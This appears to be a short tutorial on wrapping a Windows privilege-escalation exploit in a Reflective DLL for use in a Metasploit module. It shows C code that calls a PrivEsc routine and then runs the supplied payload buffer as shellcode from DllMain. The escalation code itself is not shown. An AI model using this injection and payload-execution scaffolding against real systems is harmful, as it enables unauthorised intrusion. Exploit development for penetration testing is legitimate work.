## Using the ReflectiveDll loader in a metasploit module.
### Step 1 - Make your DLL
### Step 2  Write the DLL using an extern, C-linkage entry point to make testing easier
### Step 3 Add ReflectiveDLL Injection to it.
I also noticed and appreciated that others structured the code into two parts: Exploit and Exploiter.  Exploiter does the heavy lifting with functions, and Exploit calls the functions and runs the shellcode after the exploit completes.  For example, I made a privesc and the code required to accomplish the elevation was bundled in a function called `PrivEsc` contained within my `Exploiter.cpp` file.  The Exploit file was very simple in comparison:
```c
#include <Windows.h>
#include "Exploit.h"
#include "Exploiter.h"

static VOID ExecutePayload(LPVOID lpPayload)
{
  VOID(*lpCode)() = (VOID(*)())lpPayload;
  lpCode();
  return;
}

VOID Exploit(LPVOID lpPayload)
{
  PrivEsc();
  ExecutePayload(lpPayload);
}
```

Sure enough, if you check out the `ReflectiveDll.c` file, you can see that it is really straightforward and should look a lot like your previous `DllMain` function, except there's a function call in `DLL_PROCESS_ATTACH`:
```c
#include "ReflectiveLoader.h"
#include "Exploit.h"

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
  BOOL bReturnValue = TRUE;
  switch (dwReason) {
    case DLL_QUERY_HMODULE:
      if (lpReserved != NULL)
        *(HMODULE *)lpReserved = hAppInstance;
      break;
    case DLL_PROCESS_ATTACH:
      hAppInstance = hinstDLL;
      // MessageBox(0, "In DLLMain", "Status", MB_OK);
      Exploit(lpReserved);
      break;
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
      break;
  }
  return bReturnValue;
}
```

